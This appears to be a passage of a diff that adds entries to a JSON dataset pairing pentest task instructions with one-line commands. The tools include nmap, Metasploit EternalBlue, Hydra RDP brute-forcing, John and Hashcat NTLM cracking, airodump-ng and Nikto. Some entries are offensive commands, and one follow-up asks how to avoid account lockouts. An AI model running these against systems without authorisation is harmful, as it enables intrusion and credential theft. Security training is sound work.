+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Advanced SQL injection testing",
+  "flags": ["-u", "--data", "--level"],
+  "reference_link": "http://sqlmap.org/",
+  "follow_up": [
+    "What does the `--level` flag do in SQLMap?",
+    "How to use SQLMap with cookie-based authentication?"
+  ]
+},
+{
+  "instruction": "Scan UDP ports on a target host using Nmap.",
+  "response": "nmap -sU -p 1-1000 192.168.1.1",
+  "mission_tag": "network:udp_scan",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nmap"],
+  "os_compatibility": ["Linux"],
+  "category": "Networking",
+  "use_case": "UDP port scanning",
+  "flags": ["-sU", "-p"],
+  "reference_link": "https://nmap.org/book/man-briefoptions.html",
+  "follow_up": [
+    "How to scan specific UDP services with Nmap?",
+    "Why is UDP scanning slower than TCP in Nmap?"
+  ]
+},
+{
+  "instruction": "Exploit Windows SMB using EternalBlue with Metasploit.",
+  "response": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.10; run'",
+  "mission_tag": "exploitation:eternalblue",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": true
+  },
+  "tools": ["metasploit"],
+  "os_compatibility": ["Linux"],
+  "category": "Exploitation",
+  "use_case": "Remote code execution",
+  "flags": ["-q", "-x"],
+  "reference_link": "https://docs.metasploit.com/",
+  "follow_up": [
+    "How to verify MS17-010 vulnerability before exploiting?",
+    "What payloads can be used with EternalBlue?"
+  ]
+},
+{
+  "instruction": "Capture packets from a specific wireless access point using airodump-ng.",
+  "response": "airodump-ng wlan0mon --bssid 00:11:22:33:44:55",
+  "mission_tag": "wireless:targeted_capture",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["aircrack-ng"],
+  "os_compatibility": ["Linux"],
+  "category": "Wireless",
+  "use_case": "Wireless traffic analysis",
+  "flags": ["--bssid"],
+  "reference_link": "https://www.aircrack-ng.org/",
+  "follow_up": [
+    "How to filter by channel in airodump-ng?",
+    "How to save captured packets for cracking?"
+  ]
+},
+{
+  "instruction": "Brute-force RDP credentials using Hydra.",
+  "response": "hydra -l root -P passwords.txt rdp://192.168.1.1",
+  "mission_tag": "password:bruteforce:rdp",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["hydra"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "RDP brute-forcing",
+  "flags": ["-l", "-P"],
+  "reference_link": "https://www.kali.org/tools/hydra/",
+  "follow_up": [
+    "How to detect RDP services before brute-forcing?",
+    "How to slow down Hydra to avoid lockouts?"
+  ]
+},
+{
+  "instruction": "Start Burp Suite with a proxy listener.",
+  "response": "java -jar burpsuite.jar --proxy 127.0.0.1:8080",
+  "mission_tag": "web:burp_proxy",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["burpsuite"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Web traffic interception",
+  "flags": ["--proxy"],
+  "reference_link": "https://portswigger.net/burp/documentation",
+  "follow_up": [
+    "How to import CA certificate into the browser?",
+    "How to capture HTTPS traffic with Burp?"
+  ]
+},
+{
+  "instruction": "Start Wireshark with immediate packet capture on eth0.",
+  "response": "wireshark -i eth0 -k",
+  "mission_tag": "network:live_capture",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["wireshark"],
+  "os_compatibility": ["Linux"],
+  "category": "Networking",
+  "use_case": "Real-time traffic analysis",
+  "flags": ["-i", "-k"],
+  "reference_link": "https://www.wireshark.org/docs/",
+  "follow_up": [
+    "How to apply capture filters in Wireshark?",
+    "How to save capture files for later analysis?"
+  ]
+},
+{
+  "instruction": "Crack NTLM hashes using John the Ripper.",
+  "response": "john --format=nt hash.txt",
+  "mission_tag": "password:ntlm_cracking",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["john"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "NTLM hash cracking",
+  "flags": ["--format"],
+  "reference_link": "https://www.openwall.com/john/",
+  "follow_up": [
+    "How to use custom wordlists with John?",
+    "How to resume interrupted sessions in John?"
+  ]
+},
+{
+  "instruction": "Brute-force NTLM hashes with a 4-digit mask using Hashcat.",
+  "response": "hashcat -m 1000 -a 3 hash.txt ?d?d?d?d",
+  "mission_tag": "password:mask_attack",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["hashcat"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "Mask-based hash cracking",
+  "flags": ["-m", "-a"],
+  "reference_link": "https://hashcat.net/hashcat/",
+  "follow_up": [
+    "How to optimize Hashcat mask attacks?",
+    "How to crack longer PINs using masks?"
+  ]
+},
+{
+  "instruction": "Scan an HTTPS server for vulnerabilities using Nikto.",
+  "response": "nikto -h https://example.com -ssl",
+  "mission_tag": "web:ssl_scan",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nikto"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Web server scanning",
+  "flags": ["-h", "-ssl"],
+  "reference_link": "https://cirt.net/Nikto2",
+  "follow_up": [
+    "How to scan specific ports with Nikto?",
+    "How to exclude specific checks in Nikto?"
+  ]
+},
+
+]
